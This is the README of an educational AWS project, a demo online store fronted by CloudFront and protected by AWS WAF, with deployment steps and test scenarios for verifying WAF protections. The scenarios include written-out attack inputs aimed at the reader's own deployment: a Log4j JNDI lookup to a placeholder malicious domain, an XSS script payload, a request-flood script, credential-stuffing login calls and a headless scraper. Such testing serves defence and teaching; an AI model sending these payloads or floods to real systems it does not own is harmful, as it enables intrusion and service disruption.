# The Recycle Bin Boutique
The Recycle Bin Boutique is fictitious online store that is accelerated by Amazon CloudFront and protected with AWS WAF, both part of AWS edge services. It's an educational project, that help developers in understanding the capabilities of AWS edge services. It can be used as a demo tool, and as a testing sandbox. The content of this online store , such as product names, descriptions and images are generated with the help of Anthropic's Sonnet model. The project is currently in experimental stage.

In this page, you can find details on the architecture of the boutique, how to deploy it, and the different recommended test scenarios. Note that these test scenarios cover a small percentage of the capabilities offered by AWS edge services.

![The Recycle Bin Boutique](screenshot.jpeg)

# How to deploy

Follow these steps in your command line to deploy the boutique with CDK, using the region and account information configured in your AWS CLI.

```javascript
git clone https://github.com/achrafsouk/recycle-bin-boutique.git
cd recycle-bin-boutique/store-infra
npm install
cdk deploy
```

Note the generated CloudFront domain name, and the load balancer domain name, you will use them in the test scenarios.

# Architecture

The backend of the boutique includes the following components:
* A nextJS based SSR application hosted on EC2 instances behind an Application Load Balancer.
* DynamoDB tables to store user and product information.
* S3 buckets to store original and transformed images.
* A Lamnda function that is responsible for transforming images.

The backend is exposed to the internet through a CloudFront distribution and protected with AWS WAF. CloudFront Functions coupled with KeyValueStore, implement edge logic such as: A/B testing, redirections, image format detection, etc..

![](rbb-diag.png)


# Edge security scenarios

The following test scenarios cover different kind of threats that can be mitigated using AWS WAF. Replace the example CloudFront domain name (xxxxxxxx.cloudfront.net) in the scenarios with the actual one generated in the CDK deployment output. If you would like to dive into the WAF log record for a specific request, navigate in the AWS Console to the deployed WAF WebACL, and run the following query in CloudWatch insights tab using the request id:
```
fields @timestamp, @message
| sort @timestamp desc
| filter httpRequest.requestId = 'UW9-AA4dRZVxrLJeVEWIoXt-8mZ98b7gfYH-NhXJhgwIG76HymvrOw=='
| limit 20
```

| Test scenario  | Threat category  | How to test | 
|:------------- |:--------------- | :-------------|
| Verify origin cloaking |**Protection bypass**| The Load balancer's security group is configured with CloudFront prefixlist, and the IP of the developer machine that deployed the CDK stack. On this developer machine, run the following curl command, and verify it works. Then go to Cloudshell in the AWS Console, and run the same command, and verify that the TCP connection was refused. <br/> ```curl -I http://xxxxxxxxx.xxxxx.elb.amazonaws.com```| 
| Exploit Log4j CVE | **CVE exploit** | Load the following page with malicious payload, and verify that the request is blocked with 403 error code: <br/>  ```https://xxxxxxxx.cloudfront.net/product/${jndi:ldap://malicious.domain.com/}``` |
| Post malicious XSS payload | **Cross site scripting** | Login in (user: Joud, pwd: demo), then load any product page to post the following comment with an XSS payload, and verify that the request is blocked with 403 error code: <br/> ```<script><alert>Hello></alert></script>``` |
| Rate limit with 400 threshold | **Denial of Service (DoS)** | Go to Cloudshell in the AWS Console, and run the following commands, to start a DoS from a single IP. Verify that within seconds of serving a 404 Not found from the backend, WAF starts responding with a 202 javascript challenge, then simply blocking with 403 response code after around 20 seconds of when the 400 request throshold was breached. <br/> ```wget https://raw.githubusercontent.com/achrafsouk/recycle-bin-boutique/main/scripts/rate-limit-test.sh``` <br/> ```bash rate-limit-test.sh https://xxxxxxxx.cloudfront.net/non_existing_page 400```|
| Malicious IPs | **Distributed Denial of Service (DDoS)** | To overcome rate limits, attackers can use a large number of IPs to launch DDoS attacks. AWS curates IP lists based on their reputation, and provide them as WAF Managed rules. In this example, we challenge requests coming from am proxy server IPs (VPNs, Tor, etc..) with a CAPTCHA. To test it, load the homepage using a proxy website (e.g. https://www.blockaway.net), and verify that the page is challenged with a CAPTCHA. Note that this test might not succeed everytime, since proxy operators constantly evolve their IPs.|


| Threat category  | Test scenario  | How to test | 
|:------------- |:--------------- | :-------------|
| **Web Scraping** | User-Agent classification | Run the following curl, and verify that WAF detects and blocks this HTTP library: <br/> ```curl -I https://xxxxxxxx.cloudfront.net/``` |
| **Web Scraping** | HTTP library detection | Execute the following curl and verify that a 202 javascript challenge is returned to force the acquisition of a token after multiple attempts without it from the same IP: <br/> ```for i in {1..30}; do curl -I --include --silent https://xxxxxxxx.cloudfront.net/ -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36' \| grep -e HTTP/ -e x-amzn-waf-action; done``` <br/> Load the page using another browser to see the silent challenge in action|
| **Web Scraping** | Token detection replay | Load the home page in a browser, copy the token, and then run the following curl after replacing the cookie with the token value in AWS Cloud Shell in different refions. Verify that a 202 challenge is returned to force the acquisition of a token: <br/> ```curl -I --include --silent https://xxxxxxxx.cloudfront.net/ -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36' -H 'Cookie: aws-waf-token=YOUR_TOKEN_VALUE'```|
| **Web Scraping** | Automation framework detection | Launch a headless chrome based on Selenium using the following command, and make sure that the scraper is not able to parse product page info: <br/> ```npm install selenium-webdriver``` <br/> ```node selenium.js https://xxxxxxxx.cloudfront.net/```|
| **Credential Stuffing** | Calling login api wihtout a token | Run the following curl and verify that WAF returns a 202 challenge: <br/> ```curl -d '{username: "Joe", password: "hackedpwd"}' -H "Content-Type: application/json" -X POST https://xxxxxxxx.cloudfront.net/api/login --include --silent -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36' \| grep -e HTTP/ -e x-amzn-waf-action``` |
| **Credential Stuffing** | Stolen credential detection | Use the following test _stolen credentials_ and verify that the api returns 403 block  <br/> ```WAF_TEST_CREDENTIAL@wafexample.com``` <br/> ```WAF_TEST_CREDENTIAL_PASSWORD``` |
| **Credential Stuffing** | Password traversal detection | Using the same username, e.g. joe, login with different passwords 10-20 times until the api call returns 403 |
| **Fake Account Creation** | Use a session to create many accounts | Try to create multiple acounts, and verify a 405 block after a few successful attempts |

Navigate to scripts folder using the ```cd scripts``` command, then go through the different testing scenarios, 


# Content delivery scenarios


| Use case  | Test scenario  | How to test | 
|:------------- |:--------------- | :-------------|
| **Image optimization** | Verfiy images are resized and format is optimized| NextJS Image component automatically selects the size of the image. Resize the browser and verify that the returned image size has changed. Verify that webp format is detected and returned autmatically. | 
| **A/B testing** | Return different versions of the home pages to users| Load the home page, and verify in the cookies to which segment you have been assigned to. Then, create an experiment that includes this segment in the deployed KeyValueStore, using the following config, and validate that you are receicing a different version of the home page <br/> Key: ```/``` <br/> Value: ```{ "segments" : "1,2,3,4,5,6", "countries" : "AE,FR", "rules": { "rewrite_path" : "/index-v2" }}```| 
| **Observability - RUM** | Analyze RUM performance data| Check CloudWatch RUM telemetry, and check the CloudWatch RUM console for more visibility on Core WebVitals  | 
| **HTTP redirection** | Redirect obselete links| Load this non existing campaign page ```/oldCampaign```. Verify that 404 is returned. Add the following http redirection rule to the deployed KeyValueStore, then validate that you are redirected to home page. <br/> Key: ```/oldCampaign``` <br/> Value: ```{ "rules": { "redirect" : "/" }}```| 
| **Observability - Server Timing Header** | Understand Server timing headers sent by CloudFront| Check this header on the home page response, and generate a new image size and check how the header value is incremented | 
| **Brotli compression** | Compress JS/CSS/HTML| Verify brotli compression on page text resources | 
| **Protocol acceleration** |TBD H3 | TBD | 
| **Caching** |TBD difference for home page | TBD | 
| **Dynamic acceleration** |TBD difference for home page | TBD | 
| **Lazy loading** |TBD app level | TBD | 


# Troubleshooting

If the backend is not reachable, connect to the EC2 instance using the AWS console, and use the appropriate command of the following :

```
pm2 list
pm2 restart nextjs-app
pm2 start npm --name nextjs-app -- run start -- -p 3000
cat /var/log/cloud-init-output.log
```

If you want to test the boutique locally, do the following

cdk deploy --outputs-file ../store-app/aws-backend-config.json
npm install (in store-app folder)
remove the hierarchy in the aws-backend-config.json file


# Request flow

![](rbb-flow.png)


# Future work

## Improve scenarios
* Review scnarios holisitcally, and evolve narration to to do build ups (attack scenarios, or performance improvement)
* Use cloudshell when possible
  
## Add scenarios  
* Observability: WAF logs in CloudWatch logs, Athena for CloudFront logs, CloudWatch Metrics. RUM + SERVER TIMING integration
* Social allowed 
* Graceful failover when origin not responding
* Waiting room
* Report false positive page
* Captcha before registration example
* Speculation API
* Video content
* API Get block or reduce surface attack

## Evolve code 
* Refactor nextjs app code (state, router, storage, apis, user first name/ family name etc..)
* Review Infra code: CSP, Custom resource lifecycle management, custom resource permissions, Inforce origin cloaking at L7
* Improve caching: Origin shield, review caching rules holisitcally
* Generate intial data using GenAI
* GenAI search bar
* output aws config file in store-app folder automatically for troubleshooting
* protect comment api, and finish comment section with prper backend

